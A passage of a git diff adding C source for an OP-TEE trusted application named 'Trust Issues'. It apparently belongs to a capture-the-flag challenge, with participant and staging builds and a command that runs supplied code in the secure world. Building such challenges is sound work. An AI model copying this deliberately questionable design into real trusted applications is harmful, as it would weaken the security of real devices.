+  char *obj_id;
+  size_t obj_id_sz;
+  char *data;
+  size_t data_sz;
+
+  /*
+   * Safely get the invocation parameters
+   */
+  if (param_types != exp_param_types) {
+    EMSG("Invalid parameter types: 0x%08x, expected: 0x%08x", param_types,
+         exp_param_types);
+    return TEE_ERROR_BAD_PARAMETERS;
+  }
+
+  obj_id_sz = params[0].memref.size;
+  obj_id = TEE_Malloc(obj_id_sz, 0);
+  if (!obj_id)
+    return TEE_ERROR_OUT_OF_MEMORY;
+
+  TEE_MemMove(obj_id, params[0].memref.buffer, obj_id_sz);
+
+  data_sz = params[1].memref.size;
+  data = TEE_Malloc(data_sz, 0);
+  if (!data)
+    return TEE_ERROR_OUT_OF_MEMORY;
+
+  /*
+   * Check the object exist and can be dumped into output buffer
+   * then dump it.
+   */
+  res = OpenPersistentObjectWrapper(&object, obj_id, obj_id_sz,
+                                    TEE_DATA_FLAG_ACCESS_READ |
+                                        TEE_DATA_FLAG_SHARE_READ);
+  if (res != TEE_SUCCESS) {
+    EMSG("Failed to open persistent object, res=0x%08x", res);
+    TEE_Free(obj_id);
+    TEE_Free(data);
+    return res;
+  }
+
+  res = TEE_GetObjectInfo1(object, &object_info);
+  if (res != TEE_SUCCESS) {
+    EMSG("Failed to create persistent object, res=0x%08x", res);
+    goto exit;
+  }
+
+  if (object_info.dataSize > data_sz) {
+    /*
+     * Provided buffer is too short.
+     * Return the expected size together with status "short buffer"
+     */
+    params[1].memref.size = object_info.dataSize;
+    res = TEE_ERROR_SHORT_BUFFER;
+    goto exit;
+  }
+
+  res = TEE_ReadObjectData(object, data, object_info.dataSize, &read_bytes);
+  if (res == TEE_SUCCESS)
+    TEE_MemMove(params[1].memref.buffer, data, read_bytes);
+  if (res != TEE_SUCCESS || read_bytes != object_info.dataSize) {
+    EMSG("TEE_ReadObjectData failed 0x%08x, read %" PRIu32 " over %u", res,
+         read_bytes, object_info.dataSize);
+    goto exit;
+  }
+
+  /* Return the number of byte effectively filled */
+  params[1].memref.size = read_bytes;
+exit:
+  TEE_CloseObject(object);
+  TEE_Free(obj_id);
+  TEE_Free(data);
+  return res;
+}
+#endif /* PARTICIPANTS_BUILD */
+
+/*
+ * Called when a TA is invoked. sess_ctx hold that value that was
+ * assigned by TA_OpenSessionEntryPoint(). The rest of the paramters
+ * comes from normal world.
+ */
+TEE_Result TA_InvokeCommandEntryPoint(void __maybe_unused *sess_ctx,
+                                      uint32_t cmd_id, uint32_t param_types,
+                                      TEE_Param params[4]) {
+  (void)&sess_ctx; /* Unused parameter */
+
+  IMSG("Received command: %u", cmd_id);
+  // IMSG("Received param_types: %u", param_types);
+
+  switch (cmd_id) {
+  case TA_TRUST_ISSUES_CMD_RUN_CODE:
+    return run_code_cmd(param_types, params);
+  case TA_TRUST_ISSUES_CMD_WRITE_SECURE_OBJECT:
+    return write_secure_object_cmd(param_types, params);
+#ifdef STAGING_BUILD
+#elif PARTICIPANTS_BUILD
+  case TA_TRUST_ISSUES_CMD_READ_SECURE_OBJECT:
+    return read_secure_object_cmd(param_types, params);
+#else
+#error "No build type defined"
+#endif
+  default:
+    return TEE_ERROR_BAD_PARAMETERS;
+  }
+}
diff --git a/trust_issues/ta/user_ta_header_defines.h b/trust_issues/ta/user_ta_header_defines.h
new file mode 100644
index 0000000..a7a5d25
--- /dev/null
+++ b/trust_issues/ta/user_ta_header_defines.h
@@ -0,0 +1,27 @@
+#ifndef USER_TA_HEADER_DEFINES_H
+#define USER_TA_HEADER_DEFINES_H
+
+/* To get the TA UUID definition */
+#include <trust_issues_ta.h>
+
+#define TA_UUID TA_TRUST_ISSUES_UUID
+
+/*
+ * TA properties: multi-instance TA, no specific attribute
+ * TA_FLAG_EXEC_DDR is meaningless but mandated.
+ */
+#define TA_FLAGS TA_FLAG_EXEC_DDR
+
+/* Provisioned stack size */
+#define TA_STACK_SIZE (8 * 1024)
+
+/* Provisioned heap size for TEE_Malloc() and friends */
+#define TA_DATA_SIZE (64 * 1024)
+
+/* The gpd.ta.version property */
+#define TA_VERSION "1.0"
+
+/* The gpd.ta.description property */
+#define TA_DESCRIPTION "Trust Issues TA - Secure World, questionable decisions."
+
+#endif /* USER_TA_HEADER_DEFINES_H */
